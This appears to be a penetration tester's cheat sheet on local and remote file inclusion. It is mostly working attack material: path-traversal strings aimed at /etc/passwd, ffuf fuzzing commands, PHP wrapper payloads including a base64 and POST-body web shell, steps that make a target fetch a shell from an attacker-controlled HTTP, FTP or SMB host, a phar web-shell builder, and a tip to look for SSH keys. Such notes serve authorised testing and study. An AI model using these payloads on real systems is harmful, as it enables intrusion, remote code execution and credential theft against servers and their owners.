# Local file inclusion

- [Hacktricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion#file-inclusion)
- [Liffy](https://github.com/mzfr/liffy)
- [LFISuite](https://github.com/D35m0nd142/LFISuite)
- [LFiFreak](https://github.com/OsandaMalith/LFiFreak)

## Tips
 - Try URL encoding
 - Try bypassing regex by prefixing the LFI with the approved path
 - Add ~2048 times the `/.` string at the end of the URL
    -  `echo -n "../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done`
 - Try to inject null bytes `%00` to bypass extension checking (for old frameworks)
  
If LFI works but is read only, look for credentials like ssh keys.

## Wordlists

### Detection
```
seclists/Discovery/Web-Content/burp-parameter-names.txt
```

### Exploitation
```
seclists/Fuzzing/LFI/LFI-Jhaddix.txt
seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
seclists/Discovery/Web-Content/default-web-root-directory-windows.txt
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
```

### Fuzz snippets
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://<target>/index.php?FUZZ=value' -fs 1234
```
```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'http://<target>/index.php?someField=FUZZ' -fs 1234
```
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt -u 'http://<target>/index.php?someField=../../../../FUZZ/index.php' -fs 1234
```
```bash
ffuf -w ./LFI-WordList-Linux -u 'http://<target>/index.php?someField=../../../../FUZZ' -fs 1234
```

## Snippets
```bash
../../../../../../../etc/passwd
```
```bash
/../../../../../../../etc/passwd
```
```bash
..\/..\/..\/..\/..\/..\/..\/etc/passwd
```
```bash
....//....//....//....//....//....//....//etc/passwd
```
```bash
....////....////....////....////....////....////....////etc/passwd
```
```bash
....\/....\/....\/....\/....\/....\/....\/etc/passwd
```
```bash
..././..././..././..././..././..././etc/passwd
```

## PHP 
### RFI
If `allow_url_include = On`

First try to include a local file with something like `http://127.0.0.1:80/index.php`

Then try to serve on a http server a webshell and fetch it with the RFI

FTP is also worth trying, host a local server with `sudo python -m pyftpdlib -p 21` and query it with `ftp://<attacker-ip>/shelle.php&0=id` or `ftp://user:pass@<attacker-ip>/shelle.php&0=id`

Or with SMB `impacket-smbserver -smb2support share $(pwd)` with `\\<attacker-ip>\share\shell.php&0=whoami`

### base64 filter wrapper
```
php://filter/read=convert.base64-encode/resource=<page-to-load>
```

### data wrapper
```
data://text/plain;base64,PD89YCRfR0VUWzBdYD8+&0=id
```
#### allow_url_include 
Look for config
```
php://filter/read=convert.base64-encode/resource=../../../../etc/php/X.Y/apache2/php.ini
```

### input wrapper
As a POST request
```
curl -s -X POST --data '<?=`$_GET[0]`?>' "http://<target>/...?something=php://input&0=id
```
```
curl -s -X POST --data '<\?php system('id')?>' "http://<target>/...?something=php://input
```

### expect wrapper
if enabled `extension=expect`

Use this directly in the LFI `expect://id`

### zip wrapper
```
zip://./<path>/archive.jpg%23shelle.php&0=id
```

### phar wrapper

Create a webshell
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?=`$_GET[0]`?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering()
```
```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
```
phar://./<path>/shell.jpg%2Fshell.txt&0=id
```